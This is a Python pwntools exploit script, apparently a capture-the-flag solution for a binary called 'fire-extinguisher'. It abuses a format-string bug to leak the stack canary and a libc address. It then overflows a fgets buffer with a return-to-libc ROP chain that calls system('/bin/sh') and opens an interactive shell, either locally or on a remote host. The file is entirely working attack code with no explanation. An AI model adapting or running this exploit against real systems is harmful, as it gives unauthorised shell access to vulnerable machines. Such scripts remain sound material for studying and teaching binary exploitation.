from pwn import *
import sys

exe = "./fire-extinguisher"
elf = context.binary = ELF(exe, checksec=False)

# Use system libc (no provided libs)

context.log_level = "debug"

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]), *a, **kw)
    return process([exe] + argv, *a, **kw)

# CHANGE ME
OFFSET_TO_CANARY = 72
OFFSET_TO_RBP    = 8
CANARY_IDX = 35
LIBC_IDX   = 17
LIBC_LEAK_OFF = 0x29ca8
RET_OFF = 0x2846b
POP_RDI_OFF = 0x2a145
BINSH_OFF = 0x1a7ea4
SYSTEM_OFF = 0x53110
# END


def parse_ptr(x: bytes) -> int:
    return int(x.strip(), 16)

def main():
    io = start()

    # ---- Stage 1: leak canary + libc ptr ----
    fmt = ("A" * 16 + f"%{CANARY_IDX}$p.%{LIBC_IDX}$p").encode()
    io.sendafter(b"what fire are we putting out? > ", fmt)

    leak_blob = io.recvuntil(b"extinguish! >", drop=True)
    leak_line = leak_blob.split(b"\n")[-1].strip()

    parts = leak_line.split(b".")
    if len(parts) != 2:
        log.failure(f"bad leak parse: {parts}")
        log.failure(f"raw: {leak_blob!r}")
        return
    
    canary    = parse_ptr(parts[0])
    libc_leak = parse_ptr(parts[1])

    log.success(f"canary    = {canary:#x}")
    log.success(f"libc leak = {libc_leak:#x}")

    # ---- libc base via constant offset ----
    libc_base = libc_leak - LIBC_LEAK_OFF
    log.success(f"libc base = {libc_base:#x}")

    # ---- gadgets/symbols from system libc ----
    ret     = libc_base + RET_OFF
    pop_rdi = libc_base + POP_RDI_OFF
    system = libc_base + SYSTEM_OFF
    binsh  = libc_base + BINSH_OFF

    log.info(f"ret     = {ret:#x}")
    log.info(f"pop rdi = {pop_rdi:#x}")
    log.info(f"system  = {system:#x}")
    log.info(f"binsh   = {binsh:#x}")

    # ---- Stage 2: overflow (fgets) ----
    payload = flat([
        b"A" * OFFSET_TO_CANARY,
        canary,
        b"B" * OFFSET_TO_RBP,
        ret,        # alignment
        pop_rdi,
        binsh,
        system,

    ])

    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
